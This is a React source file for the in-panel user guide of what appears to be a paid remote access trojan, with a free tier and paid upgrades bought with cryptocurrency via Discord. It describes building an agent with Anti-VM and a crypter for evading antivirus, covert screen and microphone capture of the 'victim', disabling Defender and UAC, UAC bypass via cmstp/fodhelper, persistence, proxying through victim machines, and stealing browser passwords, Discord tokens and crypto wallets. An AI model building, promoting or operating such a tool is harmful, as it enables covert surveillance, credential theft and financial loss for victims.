import { ADDRESSES } from "../../api/config";

function Section({ title, badge, children }) {
  return (
    <div style={{ marginBottom: 32 }}>
      <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 12 }}>
        <h2 style={{ fontSize: 18, fontWeight: 700, color: "var(--text)", margin: 0 }}>{title}</h2>
        {badge && <span style={{ fontSize: 9, fontWeight: 700, padding: "2px 8px", background: badge === "PAID" ? "#f0a500" : "#3a9a3a", color: "#fff", textTransform: "uppercase" }}>{badge}</span>}
      </div>
      <div style={{ fontSize: 12, lineHeight: 1.7, color: "var(--text)" }}>
        {children}
      </div>
    </div>
  );
}

function ImagePlaceholder({ src, alt }) {
  if (!src) return null;
  return (
    <div style={{ margin: "12px 0", background: "var(--input-bg)", border: "2px solid", borderColor: "var(--edge-dark) var(--edge-light) var(--edge-light) var(--edge-dark)", padding: 8, maxWidth: 640 }}>
      <img src={src} alt={alt} style={{ width: "100%", display: "block" }} />
    </div>
  );
}

export default function GuideTab() {
  return (
    <div style={{ maxWidth: 720 }}>
      <Section title="Getting Started">
        <p>Build your agent from the Build tab. Set a custom process name (shows in Task Manager), toggle UPX for compression, Anti-VM for testing in your own VM. Hit Build, download the binary.</p>
        <p style={{ marginTop: 8 }}>Run it on a Windows machine. It'll show in your agent list automatically.</p>
      </Section>

      <Section title="Remote Desktop">
        <p>Live screen streaming with full mouse and keyboard control. Quality slider for bandwidth. Control panel on the side with toggles for Defender, UAC, Task Manager, Reagentc, mouse freeze, blackout screen, BSOD trigger, volume slider, lock/restart/shutdown.</p>
        <p style={{ marginTop: 8 }}>Live microphone streaming with device selection and mute. Start/stop mic from the overlay on the stream. Audio plays through your browser with gapless playback.</p>
        <p style={{ marginTop: 8, color: "var(--muted)" }}>Buttons reflect actual state via panel handshake. If a toggle fails it stays off. Mic requires the victim to have a microphone and desktop mic access enabled in Windows privacy settings.</p>
      </Section>

      <Section title="File Explorer">
        <p>Browse the filesystem, download/upload files, multi-file zip download, content search, create/rename/delete files and folders, toggle hidden attribute.</p>
      </Section>

      <Section title="Terminal">
        <p>CMD and PowerShell tabs with working directory tracking. Type commands, see output in real-time.</p>
      </Section>

      <Section title="Task Manager">
        <p>Live process list with kill capability. Updates automatically.</p>
      </Section>

      <Section title="System">
        <p>OS/CPU/RAM/drives/network/user info. Live CPU and RAM graphs. Clipboard viewer and setter. Startup entries manager. Installed software list. Four persistence methods (registry run key, startup folder, scheduled task, Windows service) with toggle UI.</p>
      </Section>

      <Section title="Stealer">
        <p>All Chromium browsers (Chrome, Edge, Brave, Opera, Vivaldi, Yandex) plus Firefox. v10 DPAPI and v20 app_bound_encrypted_key decryption with fallback. Also grabs Discord tokens, stream keys, Roblox cookies, Minecraft accounts, and crypto wallet files.</p>
        <p style={{ marginTop: 8 }}>Run <b>.steal</b> in chat to grab everything as a zip.</p>
      </Section>

      <Section title="Commands">
        <p><b>.admin</b> — UAC elevation via cmstp/fodhelper</p>
        <p><b>.ss</b> — screenshot (sent as attachment in chat)</p>
        <p><b>.note &lt;text&gt;</b> — write note to victim desktop</p>
        <p><b>.speak &lt;text&gt;</b> — TTS on victim</p>
        <p><b>.steal</b> — full browser/wallet/game grab as zip</p>
        <p><b>.share &lt;path&gt;</b> — upload a file, opens it on victim</p>
        <p><b>.file</b> — grab Desktop/Documents/Downloads for interesting files as zip</p>
      </Section>

      <Section title="SOCKS5 Proxy" badge="PAID">
        <p>On-demand SOCKS5 proxy through the victim machine. Open the proxy modal from the agent toolbar, copy the local address into your system proxy settings.</p>
      </Section>

      <Section title="Crypter" badge="PAID">
        <p>Encrypts the binary to evade signature detection. Toggle in the Build tab.</p>
      </Section>

      <Section title="Plans">
        <p>Free gets all apps and commands. Paid ({Object.values(ADDRESSES).map((c, i, a) => `${c.price} ${c.label}${i < a.length - 1 ? " / " : ""}`).join("")}) gets SOCKS5 proxy + Crypter builds.</p>
        <p style={{ marginTop: 8 }}>DM proof on Discord for instant upgrade.</p>
      </Section>
    </div>
  );
}